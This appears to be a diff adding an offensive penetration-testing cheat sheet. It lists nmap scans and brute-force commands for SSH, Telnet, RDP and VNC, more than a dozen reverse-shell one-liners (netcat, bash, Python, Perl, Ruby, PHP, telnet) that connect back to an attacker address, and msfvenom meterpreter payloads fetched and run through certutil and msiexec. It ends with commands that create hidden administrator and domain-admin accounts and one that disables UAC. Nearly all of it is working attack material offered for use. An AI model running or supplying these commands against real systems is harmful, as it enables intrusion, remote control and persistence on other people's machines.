@@ -1,0 +1,135 @@
+# Basic Scans
+nmap -sn -n <targets>
+nmap -sP -PI -T4 -v7 <targets>
+nmap -A <host> (run this after)
+nmap -sV -F <targets>
+nmap -p- -sV -O -T4 -v7 -sC <targets>
+
+# Anonymous FTP Scan
+nmap -sC -sV -p21
+
+# Open SMB Shares Scan
+nmap --script=smb-enum-shares -p445
+
+# Open NFS Shares Scan
+nmap --script nfs-ls,nfs-showmount -p111,2049
+
+# VNC Bruteforce Scan
+nmap --script=vnc-brute -p5800,5900
+
+# RDP Bruteforce (Windows)
+ncrack -u administrator -P ./500-worst-passwords.txt -p 3389 <ip>
+
+# SSH Bruteforce
+medusa -M ssh -C /usr/share/wordlists/ssh.list -H 22-targets.txt -T 10 | grep SUCCESS | tee results.txt
+
+# Telnet Bruteforce
+medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23-targets.txt -T 10 -t 3 | grep SUCCESS | tee results.txt
+
+# Domain Controller Enumration (Windows)
+enum4linux -A <ip> | tee results.txt
+
+# PHP Webshell
+
+# Netcat Reverse Shell (Linux)
+nc -e /bin/sh 10.0.0.1 4444
+
+# Netcat Reverse Shell (Linux)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+
+# Netcat Reverse Shell (Linux)
+/bin/sh | nc attackerip 4444
+
+# Python Reverse Shell (Windows, Linux)
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Perl Reverse Shell (Linux)
+perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Perl Reverse Shell (Windows)
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# Ruby Reverse Shell (Linux)
+ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Ruby Reverse Shell (Windows)
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Bash Reverse Shell (Linux)
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+# PHP Reverse Shell (Linux)
+php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Telnet Reverse Shell (Linux)
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+
+# Telnet Reverse Shell (also listen on 4445) (Linux)
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
+
+# Powershell File Download v2.0 (Windows)
+(New-Object System.Net.WebClient).DownloadFile("http://example.com/file.hex","Outfile.hex")
+
+# Powershell File Download v2.0 (Windows)
+Import-Module BitsTransfer ; Start-BitsTransfer -source "http://example.com/file.hex"
+
+# Powershell File Download >=v3.0 (Windows)
+Invoke-WebRequest -Uri "http://example.com/file.hex" -OutFile "C:\file.hex"
+
+# Powershell File Download >=v3.0 (Windows)
+iwr "http://example.com/file.hex" -Outfile "file.hex"
+
+# Cscript File Download (Windows)
+echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", WScript.Arguments(0), /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("file.hex"); > curl.js && cscript /nologo curl.js "http://example.com/file.hex"
+
+# certutil File Download and Execute (Windows)
+exploit/multi/handler
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
+python -m SimpleHTTPServer 80
+certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
+
+# msiexec MSI File Download and Execute (Windows)
+exploit/multi/handler
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
+python -m SimpleHTTPServer 80
+msiexec /q /i //192.168.1.109/1.msi
+
+# Post Exploitation Enumeration (Linux)
+wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+
+# Post Exploitation Enumeration (Linux)
+wget https://highon.coffee/downloads/linux-local-enum.sh
+
+# Post Exploitation Enumeration (Linux)
+cd /opt/Linux_Exploit_Suggester
+
+# Post Exploitation Enumeration (Linux)
+cd /opt/unix-privesc-check
+
+# Post Exploitation Enumeration (Windows)
+cd /opt/Windows-Exploit-Suggester
+
+# Add Guest User to Administrators Group (Windows)
+net user guest /active:yes
+net user guest PASSWORD
+net localgroup administrators guest /add
+
+# Create Administrator User (Windows)
+net user /add <username> <password>
+net localgroup administrators <username> /add
+
+# Create Domain Administrator (Windows)
+net user <username> /add /active:yes /domain
+net user <username> <password> /domain 
+net localgroup administrators <username> /add /domain 
+net group "Enterprise Admins" <username> /add /domain 
+
+# Disable UAC (Windows)
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
+
+
+
+
+
+
